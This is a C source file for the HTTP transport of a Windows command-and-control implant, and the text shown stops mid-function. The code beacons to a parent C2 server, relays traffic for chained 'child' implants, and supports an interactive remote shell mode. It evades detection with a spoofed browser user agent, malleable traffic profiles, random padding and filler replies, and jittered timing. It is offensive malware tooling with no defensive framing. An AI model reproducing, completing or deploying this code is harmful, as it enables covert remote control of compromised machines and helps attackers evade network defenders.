/*==========================================================================
 * transport_http.c  -  HTTP transport for C2 client (Windows)
 *==========================================================================*/

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winhttp.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#include "transport.h"
#include "crypto_dragon.h"

#include "malleable_profile.h"

#include "padding.h"

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")

/* -- Constants ---------------------------------------------------------- */
#define HTTP_TIMEOUT_CONNECT_MS     10000
#define HTTP_TIMEOUT_SEND_MS        10000
#define HTTP_TIMEOUT_RECV_LONG_MS   40000
#define HTTP_TIMEOUT_RECV_SHELL_MS    500
#define HTTP_RETRY_INTERVAL_MS        200
#define HTTP_MAX_RECV_RETRIES         300
#define HTTP_SRV_BACKLOG               16
#define HTTP_SRV_LONG_POLL_MS       20000
#define HTTP_QUEUE_SLOTS               32
#define HTTP_MAX_HDRS                4096

static wchar_t g_http_user_agent[256]  = L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)";
static wchar_t g_http_content_type[512] = L"Content-Type: application/octet-stream\r\nConnection: keep-alive\r\n";
static wchar_t g_http_path_data[64]    = L"/c2";
static wchar_t g_http_path_hs[64]      = L"/c2/hs";
static char g_http_path_data_a[64] = "/c2";
static char g_http_path_hs_a[64]   = "/c2/hs";

static uint16_t g_http_pad_min = 0;
static uint16_t g_http_pad_max = 0;

void http_set_padding(uint16_t pad_min, uint16_t pad_max)
{
    g_http_pad_min = pad_min;
    g_http_pad_max = pad_max;
}

#define HTTP_USER_AGENT   g_http_user_agent
#define HTTP_CONTENT_TYPE g_http_content_type
#define HTTP_PATH_DATA    g_http_path_data
#define HTTP_PATH_HS      g_http_path_hs

static void jittered_sleep(DWORD base_ms)
{
    DWORD half = base_ms / 2;
    DWORD sleep_ms = half + (DWORD)randombytes_uniform(base_ms + 1);
    Sleep(sleep_ms);
}

/* -- Connection mod ---------------------------------------------- */
#define CONN_MODE_CLIENT 0   /* WinHTTP, connection to the father  */
#define CONN_MODE_SERVER 1   /* WinSock, incoming packets from childs */

/* =========================================================================
 * Frame queue (for MODE_SERVER)
 * ====================================================================== */
typedef struct { uint8_t data[WIRE_FRAME_SIZE]; } SrvFrameSlot;

typedef struct {
    SrvFrameSlot    slots[HTTP_QUEUE_SLOTS];
    int             head, tail, count;
    CRITICAL_SECTION mu;
    HANDLE          not_empty;
    HANDLE          not_full;
} SrvFrameQueue;

static void sfq_init(SrvFrameQueue *q) {
    memset(q, 0, sizeof *q);
    InitializeCriticalSection(&q->mu);
    q->not_empty = CreateEvent(NULL, FALSE, FALSE, NULL);
    q->not_full  = CreateEvent(NULL, FALSE, TRUE,  NULL);
}
static void sfq_destroy(SrvFrameQueue *q) {
    DeleteCriticalSection(&q->mu);
    if (q->not_empty) CloseHandle(q->not_empty);
    if (q->not_full)  CloseHandle(q->not_full);
}
static int sfq_push(SrvFrameQueue *q, const uint8_t *frame) {
    if (WaitForSingleObject(q->not_full, 10000) == WAIT_TIMEOUT)
        return -1;
    EnterCriticalSection(&q->mu);
    memcpy(q->slots[q->tail].data, frame, WIRE_FRAME_SIZE);
    q->tail = (q->tail + 1) % HTTP_QUEUE_SLOTS;
    q->count++;
    if (q->count < HTTP_QUEUE_SLOTS) SetEvent(q->not_full);
    SetEvent(q->not_empty);
    LeaveCriticalSection(&q->mu);
    return 0;
}
static int sfq_pop(SrvFrameQueue *q, uint8_t *frame, DWORD timeout_ms) {
    if (WaitForSingleObject(q->not_empty, timeout_ms) == WAIT_TIMEOUT)
        return -1;
    EnterCriticalSection(&q->mu);
    if (q->count == 0) { LeaveCriticalSection(&q->mu); return -1; }
    memcpy(frame, q->slots[q->head].data, WIRE_FRAME_SIZE);
    q->head = (q->head + 1) % HTTP_QUEUE_SLOTS;
    q->count--;
    SetEvent(q->not_full);
    if (q->count > 0) SetEvent(q->not_empty);
    LeaveCriticalSection(&q->mu);
    return 0;
}
static int sfq_poll(SrvFrameQueue *q, DWORD timeout_ms) {
    return (WaitForSingleObject(q->not_empty, timeout_ms) != WAIT_TIMEOUT) ? 1 : 0;
}

/* =========================================================================
 * Connection structure
 * ====================================================================== */
struct transport_conn {
    int mode;   /* CONN_MODE_CLIENT or CONN_MODE_SERVER */

    /* -- MODE_CLIENT: WinHTTP -- */
    HINTERNET        h_session;
    HINTERNET        h_connect_send;
    HINTERNET        h_connect_recv;
    HINTERNET        h_connect_hs;
    char             host[256];
    int              port;
    CRITICAL_SECTION send_lock;
    CRITICAL_SECTION recv_lock;
    volatile int     is_hs_mode;
    volatile int     shell_active;

    uint8_t          hs_server_pub[32];   /* pub_father received in the body of the POST /c2/hs */
    volatile int     hs_pub_ready;        /* 1 = hs_server_pub contains valid data */
    SrvFrameQueue    pb_q;                /* frames from POST response */

    /* -- MODE_SERVER: WinSock -- */
    SrvFrameQueue    srv_rx_q;
    SrvFrameQueue    srv_tx_q;
    struct sockaddr_in srv_addr;
    volatile int     srv_running;

    /* pub_father for the respons of the child POST /c2/hs */
    uint8_t          srv_hs_pub[32];
    volatile int     srv_hs_ready;
    HANDLE           srv_hs_event;
};

/* -- Listener status --------------------------------------------------- */
typedef struct SrvVConn {
    struct sockaddr_in addr;
    transport_conn_t  *conn;
    struct SrvVConn   *next;
} SrvVConn;

typedef struct {
    SOCKET           listen_sock;
    SrvVConn        *clients;
    CRITICAL_SECTION mu;
    transport_conn_t *new_conn;
    HANDLE           new_conn_event;
    HANDLE           dispatcher_thread;
    volatile int     running;
    malleable_profile_t profile;
    int              profile_loaded;
} SrvListenerState;

#define MAX_SRV_LISTENERS 8
static SrvListenerState *g_srv_listeners[MAX_SRV_LISTENERS];
static int               g_srv_nlisteners = 0;
static CRITICAL_SECTION  g_srv_listeners_mu;
static int               g_srv_listeners_mu_init = 0;

static void ensure_srv_mu(void) {
    if (!g_srv_listeners_mu_init) {
        InitializeCriticalSection(&g_srv_listeners_mu);
        g_srv_listeners_mu_init = 1;
    }
}

static SrvListenerState *find_srv_listener(SOCKET s) {
    ensure_srv_mu();
    EnterCriticalSection(&g_srv_listeners_mu);
    for (int i = 0; i < g_srv_nlisteners; i++)
        if (g_srv_listeners[i] && g_srv_listeners[i]->listen_sock == s) {
            LeaveCriticalSection(&g_srv_listeners_mu);
            return g_srv_listeners[i];
        }
    LeaveCriticalSection(&g_srv_listeners_mu);
    return NULL;
}

/* =========================================================================
 * Mini HTTP server on WinSock (MODE_SERVER)
 * ====================================================================== */

static int srv_read_exact(SOCKET s, void *buf, int n) {
    int got = 0;
    while (got < n) {
        int r = recv(s, (char*)buf + got, n - got, 0);
        if (r <= 0) return -1;
        got += r;
    }
    return 0;
}
static int srv_write_exact(SOCKET s, const void *buf, int n) {
    int sent = 0;
    while (sent < n) {
        int w = send(s, (const char*)buf + sent, n - sent, 0);
        if (w <= 0) return -1;
        sent += w;
    }
    return 0;
}

typedef struct {
    char    method[8];
    char    path[64];
    uint8_t body[WIRE_FRAME_SIZE + 1024];
    int     body_len;
} SrvHttpRequest;

static int srv_read_request(SOCKET s, SrvHttpRequest *req) {
    char hdr[HTTP_MAX_HDRS]; int hlen = 0;
    while (hlen < HTTP_MAX_HDRS - 1) {
        if (recv(s, hdr + hlen, 1, 0) != 1) return -1;
        hlen++; hdr[hlen] = '\0';
        if (hlen >= 4 && memcmp(hdr + hlen - 4, "\r\n\r\n", 4) == 0) break;
    }
    char *nl = strstr(hdr, "\r\n"); if (!nl) return -1;
    char first[256]; int flen = (int)(nl - hdr);
    if (flen <= 0 || flen >= (int)sizeof first) return -1;
    memcpy(first, hdr, flen); first[flen] = '\0';
    char *sp1 = strchr(first, ' '); if (!sp1) return -1; *sp1 = '\0';
    strncpy(req->method, first, sizeof(req->method) - 1);
    req->method[sizeof(req->method) - 1] = '\0';
    char *sp2 = strchr(sp1 + 1, ' '); if (sp2) *sp2 = '\0';
    strncpy(req->path, sp1 + 1, sizeof(req->path) - 1);
    req->path[sizeof(req->path) - 1] = '\0';
    req->body_len = 0;
    char *cl = strstr(hdr, "Content-Length:");
    if (!cl) cl = strstr(hdr, "content-length:");
    if (!cl) return 0;
    int clen = atoi(cl + 15);
    if (clen <= 0) return 0;
    if (clen > (int)sizeof req->body) return -1;
    if (srv_read_exact(s, req->body, clen) != 0) return -1;
    req->body_len = clen;
    return 0;
}

static int srv_respond(SOCKET s, int code, const uint8_t *body, int blen) {
    char hdr[256]; int hlen;
    if (body && blen > 0) {
        hlen = sprintf(hdr,
            "HTTP/1.1 %d OK\r\nContent-Type: application/octet-stream\r\n"
            "Content-Length: %d\r\nConnection: keep-alive\r\n\r\n", code, blen);
    } else {
        hlen = sprintf(hdr,
            "HTTP/1.1 204 No Content\r\nContent-Length: 0\r\n"
            "Connection: keep-alive\r\n\r\n");
    }
    if (srv_write_exact(s, hdr, hlen) != 0) return -1;
    if (body && blen > 0) if (srv_write_exact(s, body, blen) != 0) return -1;
    return 0;
}

typedef struct { SOCKET s; SrvListenerState *ls; } SrvWorkerArg;

static DWORD WINAPI srv_worker_thread(LPVOID arg) {
    SrvWorkerArg *wa = (SrvWorkerArg*)arg;
    SOCKET s = wa->s;
    SrvListenerState *ls = wa->ls;
    struct sockaddr_in caddr = {0};
    int caddrlen = sizeof caddr;
    getpeername(s, (struct sockaddr*)&caddr, &caddrlen);
    free(wa);

    while (1) {
        SrvHttpRequest req; memset(&req, 0, sizeof req);
        if (srv_read_request(s, &req) != 0) { closesocket(s); return 0; }

        //printf("[HTTP-SRV] received %s %s (body=%d)\n", req.method, req.path, req.body_len);
        //printf("[HTTP-SRV] expected hs=%s data=%s\n", ls->profile.http_path_hs, ls->profile.http_path_data);

        transport_conn_t *conn = NULL;
        EnterCriticalSection(&ls->mu);
        for (SrvVConn *v = ls->clients; v; v = v->next)
            if (v->addr.sin_addr.s_addr == caddr.sin_addr.s_addr) { conn = v->conn; break; }

        /* POST /c2/hs - new child or reconnect */
        if (strcmp(req.method, "POST") == 0 && strcmp(req.path, ls->profile.http_path_hs) == 0 && req.body_len == 32) {
            if (!conn) {
                conn = calloc(1, sizeof *conn);
                conn->mode = CONN_MODE_SERVER;
                sfq_init(&conn->srv_rx_q);
                sfq_init(&conn->srv_tx_q);
                conn->srv_addr = caddr;
                conn->srv_running = 1;
                conn->srv_hs_event = CreateEvent(NULL, FALSE, FALSE, NULL);
                SrvVConn *v = malloc(sizeof *v);
                if (v) { v->addr = caddr; v->conn = conn; v->next = ls->clients; ls->clients = v; }
            } else {
                /* Reconnect: clean out the queues */
                EnterCriticalSection(&conn->srv_rx_q.mu);
                conn->srv_rx_q.head = conn->srv_rx_q.tail = conn->srv_rx_q.count = 0;
                LeaveCriticalSection(&conn->srv_rx_q.mu);
                EnterCriticalSection(&conn->srv_tx_q.mu);
                conn->srv_tx_q.head = conn->srv_tx_q.tail = conn->srv_tx_q.count = 0;
                LeaveCriticalSection(&conn->srv_tx_q.mu);
            }
            uint8_t padded[WIRE_FRAME_SIZE] = {0};
            memcpy(padded, req.body, 32);
            sfq_push(&conn->srv_rx_q, padded);

            /* New client signal to http_accept() */
            ls->new_conn = conn;
            SetEvent(ls->new_conn_event);
            LeaveCriticalSection(&ls->mu);

            /* Waiting for the listener_thread */
            if (WaitForSingleObject(conn->srv_hs_event, 10000) == WAIT_OBJECT_0
                && conn->srv_hs_ready) {
                srv_respond(s, 200, conn->srv_hs_pub, 32);
                conn->srv_hs_ready = 0;
            } else {
                fprintf(stderr, "[HTTP-SRV] timeout waiting for pub_father\n");
                srv_respond(s, 204, NULL, 0);
            }
            continue;
        }
        LeaveCriticalSection(&ls->mu);

        if (!conn) { srv_respond(s, 404, NULL, 0); closesocket(s); return 0; }

        if (strcmp(req.method, "POST") == 0 && strcmp(req.path, ls->profile.http_path_data) == 0 && req.body_len >= WIRE_FRAME_SIZE) {
            sfq_push(&conn->srv_rx_q, req.body);
            uint8_t frame[WIRE_FRAME_SIZE];
            if (sfq_pop(&conn->srv_tx_q, frame, 0) == 0) {
                uint8_t sendbuf[WIRE_FRAME_SIZE + 1024];
                memcpy(sendbuf, frame, WIRE_FRAME_SIZE);
                int pad_len = generate_padding(ls->profile.pkt_pad_min, ls->profile.pkt_pad_max, sendbuf + WIRE_FRAME_SIZE, 1024);
                srv_respond(s, 200, sendbuf, WIRE_FRAME_SIZE + pad_len);
            } else {
                uint8_t filler[64];
                uint16_t flen = 8 + (uint16_t)randombytes_uniform(56);
                randombytes_buf(filler, flen);
                srv_respond(s, 200, filler, (int)flen);
            }
        }
        else if (strcmp(req.method, "GET") == 0 && strcmp(req.path, ls->profile.http_path_data) == 0) {
            uint8_t frame[WIRE_FRAME_SIZE];
            if (sfq_pop(&conn->srv_tx_q, frame, HTTP_SRV_LONG_POLL_MS) == 0) {
                uint8_t sendbuf[WIRE_FRAME_SIZE + 1024];
                memcpy(sendbuf, frame, WIRE_FRAME_SIZE);
                int pad_len = generate_padding(ls->profile.pkt_pad_min, ls->profile.pkt_pad_max, sendbuf + WIRE_FRAME_SIZE, 1024);
                srv_respond(s, 200, sendbuf, WIRE_FRAME_SIZE + pad_len);
            } else {
                uint8_t filler[64];
                uint16_t flen = 8 + (uint16_t)randombytes_uniform(56);
                randombytes_buf(filler, flen);
                srv_respond(s, 200, filler, (int)flen);
            }
        }
        else {
            srv_respond(s, 404, NULL, 0);
            closesocket(s); return 0;
        }
    }
    return 0;
}

static DWORD WINAPI srv_dispatcher_thread(LPVOID arg) {
    SrvListenerState *ls = (SrvListenerState*)arg;
    while (ls->running) {
        struct sockaddr_in caddr; int caddrlen = sizeof caddr;
        SOCKET cfd = accept(ls->listen_sock, (struct sockaddr*)&caddr, &caddrlen);
        if (cfd == INVALID_SOCKET) { if (!ls->running) break; continue; }
        SrvWorkerArg *wa = malloc(sizeof *wa);
        if (!wa) { closesocket(cfd); continue; }
        wa->s = cfd; wa->ls = ls;
        HANDLE t = CreateThread(NULL, 0, srv_worker_thread, (LPVOID)wa, 0, NULL);
        if (!t) { free(wa); closesocket(cfd); }
        else CloseHandle(t);
    }
    return 0;
}

/* =========================================================================
 * transport_t callbacks
 * ====================================================================== */

static int http_listen(int port) {
    SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (s == INVALID_SOCKET) return -1;
    int yes = 1; setsockopt(s, SOL_SOCKET, SO_REUSEADDR, (const char*)&yes, sizeof yes);
    struct sockaddr_in sa = {0};
    sa.sin_family = AF_INET; sa.sin_addr.s_addr = INADDR_ANY;
    sa.sin_port = htons((u_short)port);
    if (bind(s, (struct sockaddr*)&sa, sizeof sa) != 0) { closesocket(s); return -1; }
    if (listen(s, HTTP_SRV_BACKLOG) != 0) { closesocket(s); return -1; }

    SrvListenerState *ls = calloc(1, sizeof *ls);
    if (!ls) { closesocket(s); return -1; }
    ls->listen_sock = s; ls->running = 1;
    memset(&ls->profile, 0, sizeof(ls->profile));
    strncpy(ls->profile.http_path_hs, g_http_path_hs_a, sizeof(ls->profile.http_path_hs) - 1);
    strncpy(ls->profile.http_path_data, g_http_path_data_a, sizeof(ls->profile.http_path_data) - 1);
    InitializeCriticalSection(&ls->mu);
    ls->new_conn_event = CreateEvent(NULL, FALSE, FALSE, NULL);

    ls->dispatcher_thread = CreateThread(NULL, 0, srv_dispatcher_thread, (LPVOID)ls, 0, NULL);
    if (!ls->dispatcher_thread) {
        CloseHandle(ls->new_conn_event);
        DeleteCriticalSection(&ls->mu);
        free(ls); closesocket(s); return -1;
    }

    ensure_srv_mu();
    EnterCriticalSection(&g_srv_listeners_mu);
    if (g_srv_nlisteners < MAX_SRV_LISTENERS) g_srv_listeners[g_srv_nlisteners++] = ls;
    LeaveCriticalSection(&g_srv_listeners_mu);

    printf("[HTTP-SRV] listening on port %d\n", port);
    return (int)(INT_PTR)s;
}

static transport_conn_t *http_accept(int listener_fd, struct sockaddr_in *out_addr) {
    SOCKET s = (SOCKET)(INT_PTR)listener_fd;
    SrvListenerState *ls = find_srv_listener(s);
    if (!ls) return NULL;

    WaitForSingleObject(ls->new_conn_event, INFINITE);

    EnterCriticalSection(&ls->mu);
    transport_conn_t *conn = ls->new_conn; ls->new_conn = NULL;
    LeaveCriticalSection(&ls->mu);

    if (out_addr) *out_addr = conn->srv_addr;
    return conn;
}

/* connect(): WinHTTP to server/father */
static transport_conn_t *http_connect(const char *host, int port) {
    transport_conn_t *conn = calloc(1, sizeof *conn);
    if (!conn) return NULL;
    conn->mode = CONN_MODE_CLIENT;
    strncpy(conn->host, host, sizeof(conn->host) - 1);
    conn->port = port;
    conn->hs_pub_ready = 0;
    InitializeCriticalSection(&conn->send_lock);
    InitializeCriticalSection(&conn->recv_lock);

    conn->h_session = WinHttpOpen(HTTP_USER_AGENT,
        WINHTTP_ACCESS_TYPE_NO_PROXY,
        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!conn->h_session) goto fail;

    wchar_t whost[256] = {0};
    MultiByteToWideChar(CP_ACP, 0, host, -1, whost, 256);
    conn->h_connect_send = WinHttpConnect(conn->h_session, whost, (INTERNET_PORT)port, 0);
    conn->h_connect_recv = WinHttpConnect(conn->h_session, whost, (INTERNET_PORT)port, 0);
    conn->h_connect_hs   = WinHttpConnect(conn->h_session, whost, (INTERNET_PORT)port, 0);
    if (!conn->h_connect_send || !conn->h_connect_recv || !conn->h_connect_hs) goto fail;

    sfq_init(&conn->pb_q);
    printf("[HTTP] connected to %s:%d\n", host, port);
    return conn;

fail:
    if (conn->h_connect_send) WinHttpCloseHandle(conn->h_connect_send);
    if (conn->h_connect_recv) WinHttpCloseHandle(conn->h_connect_recv);
    if (conn->h_connect_hs)   WinHttpCloseHandle(conn->h_connect_hs);
    if (conn->h_session)      WinHttpCloseHandle(conn->h_session);
    DeleteCriticalSection(&conn->send_lock);
    DeleteCriticalSection(&conn->recv_lock);
    free(conn); return NULL;
}

static int http_send(transport_conn_t *conn, const uint8_t *buf, size_t len) {
    if (!conn || !buf || len == 0) return -1;

    /* -- MODE_SERVER -- */
    if (conn->mode == CONN_MODE_SERVER) {
        if (len == 32) {
            memcpy(conn->srv_hs_pub, buf, 32);
            conn->srv_hs_ready = 1;
            SetEvent(conn->srv_hs_event);
            return 32;
        }
        if (len != WIRE_FRAME_SIZE) return -1;
        return sfq_push(&conn->srv_tx_q, buf) == 0 ? (int)WIRE_FRAME_SIZE : -1;
    }

    /* -- MODE_CLIENT -- */
    HINTERNET hc   = conn->is_hs_mode ? conn->h_connect_hs   : conn->h_connect_send;
    const wchar_t *path = conn->is_hs_mode ? HTTP_PATH_HS : HTTP_PATH_DATA;

    EnterCriticalSection(&conn->send_lock);
    HINTERNET h_req = WinHttpOpenRequest(hc, L"POST", path, NULL,
        WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if (!h_req) { LeaveCriticalSection(&conn->send_lock); return -1; }

    DWORD recv_to = conn->shell_active ? HTTP_TIMEOUT_RECV_SHELL_MS : HTTP_TIMEOUT_RECV_LONG_MS;
    WinHttpSetTimeouts(h_req, HTTP_TIMEOUT_CONNECT_MS, HTTP_TIMEOUT_CONNECT_MS,
                       HTTP_TIMEOUT_SEND_MS, recv_to);

    LPVOID send_buf = (LPVOID)buf;
    DWORD  send_len = (DWORD)len;
    uint8_t *padded = NULL;

    if (!conn->is_hs_mode && len == WIRE_FRAME_SIZE && g_http_pad_max > 0) {
        uint8_t pad[1024];
        int pad_len = generate_padding(g_http_pad_min, g_http_pad_max, pad, 1024);
        if (pad_len > 0) {
            padded = malloc(WIRE_FRAME_SIZE + pad_len);
            if (padded) {
                memcpy(padded, buf, WIRE_FRAME_SIZE);
                memcpy(padded + WIRE_FRAME_SIZE, pad, pad_len);
                send_buf = padded;
                send_len = WIRE_FRAME_SIZE + pad_len;
            }
        }
    }

    BOOL ok = WinHttpSendRequest(h_req, HTTP_CONTENT_TYPE, (DWORD)-1L, send_buf, send_len, send_len, 0);
    if (!ok || !WinHttpReceiveResponse(h_req, NULL)) {
        WinHttpCloseHandle(h_req); 
        if (padded) free(padded);
        LeaveCriticalSection(&conn->send_lock); 
        return -1;
    }

    DWORD status = 0, sz = sizeof(DWORD);
    WinHttpQueryHeaders(h_req, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
        WINHTTP_HEADER_NAME_BY_INDEX, &status, &sz, WINHTTP_NO_HEADER_INDEX);

    if (conn->is_hs_mode && status == 200) {
        DWORD avail = 0, rd = 0;
        WinHttpQueryDataAvailable(h_req, &avail);
        if (avail >= 32) {
            WinHttpReadData(h_req, conn->hs_server_pub, 32, &rd);
            if (rd == 32) {
                conn->hs_pub_ready = 1;
                printf("[HTTP] hs_server_pub riceived (%lu byte)\n", rd);
            } else {
                fprintf(stderr, "[HTTP] WARNING: hs read only %lu/32 byte\n", rd);
            }
        } else {
            fprintf(stderr, "[HTTP] WARNING: response /c2/hs status 200 but body %lu byte\n", avail);
        }
    }

    if (!conn->is_hs_mode && status == 200) {
        uint8_t resp[WIRE_FRAME_SIZE + 1024];
        size_t total = 0;
        DWORD avail = 0;
        while (WinHttpQueryDataAvailable(h_req, &avail) && avail > 0) {
            DWORD to_read = (total + avail <= sizeof(resp)) ? avail : (DWORD)(sizeof(resp) - total);
            if (to_read == 0) break;
            DWORD rd = 0;
            if (!WinHttpReadData(h_req, resp + total, to_read, &rd)) break;
            total += rd;
        }
        if (total >= WIRE_FRAME_SIZE)
            sfq_push(&conn->pb_q, resp);
    }

    WinHttpCloseHandle(h_req);
    if (padded) free(padded);
    LeaveCriticalSection(&conn->send_lock);
    return (status == 200) ? (int)len : -1;
}

static int http_recv(transport_conn_t *conn, uint8_t *buf, size_t len) {
    if (!conn || !buf || len == 0) return -1;

    /* -- MODE_SERVER -- */
    if (conn->mode == CONN_MODE_SERVER) {
        uint8_t frame[WIRE_FRAME_SIZE];
        if (sfq_pop(&conn->srv_rx_q, frame, INFINITE) != 0) return -1;
        size_t copy = (len < WIRE_FRAME_SIZE) ? len : WIRE_FRAME_SIZE;
        memcpy(buf, frame, copy);
        return (int)copy;
    }

    /* -- MODE_CLIENT: consume hs_server_pub if available -- */
    if (conn->is_hs_mode && conn->hs_pub_ready) {
        size_t copy = (len < 32) ? len : 32;
        memcpy(buf, conn->hs_server_pub, copy);
        conn->hs_pub_ready = 0;
        return (int)copy;
    }

    /* -- MODE_CLIENT: GET /c2 long-poll normal -- */
    if (conn->is_hs_mode) {
        fprintf(stderr, "[HTTP] recv in hs_mode ma hs_pub_ready==0, waiting...\n");
        for (int i = 0; i < 100 && !conn->hs_pub_ready; i++) Sleep(50);
        if (conn->hs_pub_ready) {
            size_t copy = (len < 32) ? len : 32;
            memcpy(buf, conn->hs_server_pub, copy);
            conn->hs_pub_ready = 0;
            return (int)copy;
        }
        fprintf(stderr, "[HTTP] recv in hs_mode: timeout attended hs_pub\n");
        return -1;
    }

        /* --- Piggyback: check queue (non-blocking) --- */
    {
        uint8_t pb_frame[WIRE_FRAME_SIZE];
        if (sfq_pop(&conn->pb_q, pb_frame, 0) == 0) {
            size_t copy = (len < WIRE_FRAME_SIZE) ? len : WIRE_FRAME_SIZE;
            memcpy(buf, pb_frame, copy);
            return (int)copy;
        }
    }

    for (int attempt = 0; attempt < HTTP_MAX_RECV_RETRIES; attempt++) {
        {
            uint8_t pb_frame[WIRE_FRAME_SIZE];
            if (sfq_pop(&conn->pb_q, pb_frame, 0) == 0) {
                size_t copy = (len < WIRE_FRAME_SIZE) ? len : WIRE_FRAME_SIZE;
                memcpy(buf, pb_frame, copy);
                return (int)copy;
            }
        }

        EnterCriticalSection(&conn->recv_lock);
        DWORD recv_to = conn->shell_active ? HTTP_TIMEOUT_RECV_SHELL_MS : HTTP_TIMEOUT_RECV_LONG_MS;

        HINTERNET h_req = WinHttpOpenRequest(conn->h_connect_recv, L"GET", HTTP_PATH_DATA,
            NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
        if (!h_req) { LeaveCriticalSection(&conn->recv_lock); jittered_sleep(HTTP_RETRY_INTERVAL_MS); continue; }
        WinHttpSetTimeouts(h_req, HTTP_TIMEOUT_CONNECT_MS, HTTP_TIMEOUT_CONNECT_MS,
                           HTTP_TIMEOUT_SEND_MS, recv_to);

        BOOL ok = WinHttpSendRequest(h_req, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                                      WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
        if (!ok || !WinHttpReceiveResponse(h_req, NULL)) {
            DWORD err = GetLastError();
            WinHttpCloseHandle(h_req); LeaveCriticalSection(&conn->recv_lock);
            if (err == ERROR_WINHTTP_TIMEOUT) continue;
            jittered_sleep(HTTP_RETRY_INTERVAL_MS); continue;
        }

        DWORD status = 0, sz = sizeof(DWORD);
        WinHttpQueryHeaders(h_req, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
            WINHTTP_HEADER_NAME_BY_INDEX, &status, &sz, WINHTTP_NO_HEADER_INDEX);

        if (status != 200) {
            WinHttpCloseHandle(h_req); LeaveCriticalSection(&conn->recv_lock);
            if (status == 204) { jittered_sleep(HTTP_RETRY_INTERVAL_MS); continue; }
            return -1;
        }

        size_t total = 0, cap = FRAME_SIZE * 2;
        uint8_t *resp = malloc(cap);
        if (!resp) { WinHttpCloseHandle(h_req); LeaveCriticalSection(&conn->recv_lock); return -1; }

        DWORD avail = 0;
        while (WinHttpQueryDataAvailable(h_req, &avail) && avail > 0) {
            if (total + avail > cap) {
                cap = total + avail + FRAME_SIZE;
                uint8_t *tmp = realloc(resp, cap);
                if (!tmp) { free(resp); WinHttpCloseHandle(h_req); LeaveCriticalSection(&conn->recv_lock); return -1; }
                resp = tmp;
            }
            DWORD rd = 0;
            if (!WinHttpReadData(h_req, resp + total, avail, &rd)) break;
            total += rd;
        }
        WinHttpCloseHandle(h_req);
        LeaveCriticalSection(&conn->recv_lock);

        if (total < len) { free(resp); jittered_sleep(HTTP_RETRY_INTERVAL_MS); continue; }
        memcpy(buf, resp, len);
        free(resp);
        return (int)len;
    }
    return -1;
}

static int http_poll(transport_conn_t *conn, int timeout_ms) {
    if (!conn) return -1;
    if (conn->mode == CONN_MODE_SERVER)
        return sfq_poll(&conn->srv_rx_q, (DWORD)(timeout_ms > 0 ? timeout_ms : 0));
    return 0;
}

static void http_close(transport_conn_t *conn) {
    if (!conn) return;
    if (conn->mode == CONN_MODE_SERVER) {
        conn->srv_running = 0;
        sfq_destroy(&conn->srv_rx_q);
        sfq_destroy(&conn->srv_tx_q);
        if (conn->srv_hs_event) CloseHandle(conn->srv_hs_event);
    } else {
        sfq_destroy(&conn->pb_q);
        if (conn->h_connect_send) WinHttpCloseHandle(conn->h_connect_send);
        if (conn->h_connect_recv) WinHttpCloseHandle(conn->h_connect_recv);
        if (conn->h_connect_hs)   WinHttpCloseHandle(conn->h_connect_hs);
        if (conn->h_session)      WinHttpCloseHandle(conn->h_session);
        DeleteCriticalSection(&conn->send_lock);
        DeleteCriticalSection(&conn->recv_lock);
    }
    free(conn);
}

static void http_close_listener(int listener_fd) {
    SOCKET s = (SOCKET)(INT_PTR)listener_fd;
    SrvListenerState *ls = find_srv_listener(s);
    if (ls) { ls->running = 0; CloseHandle(ls->new_conn_event); }
    closesocket(s);
}

static int http_get_fd(transport_conn_t *conn) { (void)conn; return -1; }

void http_set_hs_mode(transport_conn_t *conn, int enabled) {
    if (conn && conn->mode == CONN_MODE_CLIENT) {
        conn->is_hs_mode = enabled;
        if (!enabled) conn->hs_pub_ready = 0;  /* reset at the end of the handshake */
    }
}
void http_set_shell_active(transport_conn_t *conn, int active) {
    if (conn && conn->mode == CONN_MODE_CLIENT) conn->shell_active = active;
}

void http_apply_profile(const char *user_agent, const char *content_type,
                        const char *path_data, const char *path_hs,
                        const char *extra_headers)
{
    if (user_agent && user_agent[0])
        MultiByteToWideChar(CP_ACP, 0, user_agent, -1, g_http_user_agent, 256);
    if (path_data && path_data[0]) {
        MultiByteToWideChar(CP_ACP, 0, path_data, -1, g_http_path_data, 64);
        strncpy(g_http_path_data_a, path_data, sizeof(g_http_path_data_a) - 1);
        g_http_path_data_a[sizeof(g_http_path_data_a) - 1] = '\0';
    }
    if (path_hs && path_hs[0]) {
        MultiByteToWideChar(CP_ACP, 0, path_hs, -1, g_http_path_hs, 64);
        strncpy(g_http_path_hs_a, path_hs, sizeof(g_http_path_hs_a) - 1);
        g_http_path_hs_a[sizeof(g_http_path_hs_a) - 1] = '\0';
    }
    if (content_type && content_type[0]) {
        wchar_t ct[256]; ct[0] = L'\0';
        swprintf(ct, 256, L"Content-Type: ");
        wchar_t wct[128];
        MultiByteToWideChar(CP_ACP, 0, content_type, -1, wct, 128);
        wcscat(ct, wct);
        wcscat(ct, L"\r\nConnection: keep-alive\r\n");
        if (extra_headers && extra_headers[0]) {
            wchar_t weh[256];
            MultiByteToWideChar(CP_ACP, 0, extra_headers, -1, weh, 256);
            wcscat(ct, weh);
            if (ct[wcslen(ct)-1] != L'\n') wcscat(ct, L"\r\n");
        }
        wcscpy(g_http_content_type, ct);
    }
    printf("[HTTP] Profile applied: path_data=%ls path_hs=%ls\n",
           g_http_path_data, g_http_path_hs);
}

void http_server_set_listener_profile(int listen_fd, const malleable_profile_t *prof)
{
    SOCKET s = (SOCKET)(INT_PTR)listen_fd;
    SrvListenerState *ls = find_srv_listener(s);
    if (!ls || !prof) return;
    memcpy(&ls->profile, prof, sizeof(ls->profile));
    ls->profile_loaded = 1;
